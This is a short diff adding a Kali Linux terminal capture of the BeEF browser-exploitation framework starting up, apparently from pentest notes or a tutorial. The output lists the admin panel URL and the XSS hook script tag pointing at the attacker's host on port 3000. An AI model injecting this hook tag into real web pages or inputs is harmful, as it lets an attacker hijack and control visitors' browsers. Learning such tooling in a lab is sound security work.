@@ -1,0 +1,17 @@
+┌──(kali㉿kali)-[~]
+└─$ sudo beef-xss-start                                      
+[i] GeoIP database is missing
+[i] Run geoipupdate to download / update Maxmind GeoIP database
+[*]  Web UI: http://127.0.0.1:3000/ui/panel
+[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
+[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
+
+
+┏━(Message from Kali developers)
+┃ 
+┃ Please wait for the beef-xss service to start
+┃ ............................................................
+┃ [*] Web UI: http://127.0.0.1:3000/ui/panel
+┃ [i] You might need to refresh your browser once it opens
+┃ 
+┗━
